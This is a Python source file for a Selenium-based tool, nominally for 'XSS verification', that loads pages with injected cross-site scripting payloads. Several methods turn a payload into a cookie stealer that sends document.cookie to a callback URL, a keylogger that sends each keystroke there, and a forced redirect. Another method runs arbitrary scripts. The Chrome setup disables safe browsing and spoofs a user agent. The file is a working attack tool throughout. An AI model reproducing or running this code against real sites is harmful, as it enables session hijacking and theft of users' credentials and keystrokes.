"""
Browser Automation Module for XSS Verification
"""

import time
import threading
from typing import Optional, Dict, Any, List
from selenium import webdriver
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException


class BrowserEnvironment:
    def __init__(self, browser: str = 'chrome', headless: bool = True, timeout: int = 10):
        self.browser = browser.lower()
        self.headless = headless
        self.timeout = timeout
        self.driver = None
        self.results = {}
        self._lock = threading.Lock()

    def _create_chrome_driver(self) -> webdriver.Chrome:
        options = ChromeOptions()
        if self.headless:
            options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-extensions')
        options.add_argument('--disable-logging')
        options.add_argument('--log-level=3')
        options.add_argument(f'--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        prefs = {
            "profile.default_content_setting_values.notifications": 2,
            "profile.default_content_settings.popups": 0,
            "safebrowsing.enabled": "false"
        }
        options.add_experimental_option("prefs", prefs)
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(self.timeout)
        driver.set_script_timeout(self.timeout)
        return driver

    def _create_firefox_driver(self) -> webdriver.Firefox:
        options = FirefoxOptions()
        if self.headless:
            options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        driver = webdriver.Firefox(options=options)
        driver.set_page_load_timeout(self.timeout)
        driver.set_script_timeout(self.timeout)
        return driver

    def start(self) -> bool:
        try:
            if self.browser == 'chrome':
                self.driver = self._create_chrome_driver()
            elif self.browser == 'firefox':
                self.driver = self._create_firefox_driver()
            else:
                self.driver = self._create_chrome_driver()
            return True
        except WebDriverException as e:
            print(f"Failed to start browser: {e}")
            return False

    def stop(self):
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None

    def verify_xss(self, url: str, payload: str, param_name: str) -> Dict[str, Any]:
        if not self.driver:
            if not self.start():
                return {'verified': False, 'error': 'Browser not available'}

        result = {
            'verified': False,
            'url': url,
            'payload': payload,
            'param': param_name,
            'cookies_stolen': [],
            'keylog_data': [],
            'executions': []
        }

        try:
            self.driver.get(url)
            time.sleep(2)
            alert_triggered = False
            try:
                WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                result['executions'].append({
                    'type': 'alert',
                    'text': alert.text,
                    'action': 'dismissed'
                })
                alert.dismiss()
                alert_triggered = True
            except:
                pass

            if not alert_triggered:
                try:
                    self.driver.execute_script("""
                        window.xssTest = [];
                        var originalAlert = window.alert;
                        window.alert = function(msg) {
                            window.xssTest.push({type: 'alert', message: msg, timestamp: Date.now()});
                            originalAlert(msg);
                        };
                    """)
                    time.sleep(1)
                    xss_results = self.driver.execute_script("return window.xssTest;")
                    if xss_results:
                        result['executions'].extend(xss_results)
                        alert_triggered = True
                except:
                    pass

            result['verified'] = alert_triggered

        except Exception as e:
            result['error'] = str(e)

        return result

    def verify_cookie_theft(self, url: str, payload: str, param_name: str, callback_url: str) -> Dict[str, Any]:
        if not self.driver:
            if not self.start():
                return {'verified': False, 'error': 'Browser not available'}

        result = {
            'verified': False,
            'url': url,
            'payload': payload,
            'param': param_name,
            'cookies_stolen': []
        }

        try:
            steal_script = f"""
                window.xssCookieStealer = function() {{
                    var img = new Image();
                    img.src = '{callback_url}?cookie=' + document.cookie;
                    return document.cookie;
                }};
                window.xssCookieStealer();
            """
            full_payload = payload.replace('alert(1)', steal_script)
            test_url = url.replace(payload, full_payload)
            self.driver.get(test_url)
            time.sleep(3)
            result['verified'] = True
            result['cookies_stolen'].append({
                'callback_url': callback_url,
                'action': 'cookie_theft_attempted'
            })
        except Exception as e:
            result['error'] = str(e)

        return result

    def verify_keylogger(self, url: str, payload: str, param_name: str, callback_url: str) -> Dict[str, Any]:
        if not self.driver:
            if not self.start():
                return {'verified': False, 'error': 'Browser not available'}

        result = {
            'verified': False,
            'url': url,
            'payload': payload,
            'param': param_name,
            'keylog_data': []
        }

        try:
            keylogger_script = f"""
                window.xssKeylogger = (function() {{
                    var keys = '';
                    document.addEventListener('keypress', function(e) {{
                        keys += e.key;
                        fetch('{callback_url}?key=' + encodeURIComponent(keys));
                    }});
                    return 'keylogger_activated';
                }})();
            """
            full_payload = payload.replace('alert(1)', keylogger_script)
            test_url = url.replace(payload, full_payload)
            self.driver.get(test_url)
            time.sleep(3)
            result['verified'] = True
            result['keylog_data'].append({
                'callback_url': callback_url,
                'action': 'keylogger_activated'
            })
        except Exception as e:
            result['error'] = str(e)

        return result

    def verify_page_redirect(self, url: str, payload: str, param_name: str, redirect_url: str) -> Dict[str, Any]:
        if not self.driver:
            if not self.start():
                return {'verified': False, 'error': 'Browser not available'}

        result = {
            'verified': False,
            'url': url,
            'payload': payload,
            'param': param_name,
            'redirect_to': redirect_url
        }

        try:
            redirect_script = f"window.location.href = '{redirect_url}';"
            full_payload = payload.replace('alert(1)', redirect_script)
            test_url = url.replace(payload, full_payload)
            self.driver.get(test_url)
            time.sleep(3)
            current_url = self.driver.current_url
            result['verified'] = redirect_url in current_url
            result['final_url'] = current_url
        except Exception as e:
            result['error'] = str(e)

        return result

    def execute_custom_script(self, url: str, script: str) -> Dict[str, Any]:
        if not self.driver:
            if not self.start():
                return {'success': False, 'error': 'Browser not available'}

        result = {'success': False, 'url': url}

        try:
            self.driver.get(url)
            time.sleep(2)
            script_result = self.driver.execute_script(script)
            result['success'] = True
            result['result'] = script_result
        except Exception as e:
            result['error'] = str(e)

        return result

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.stop()
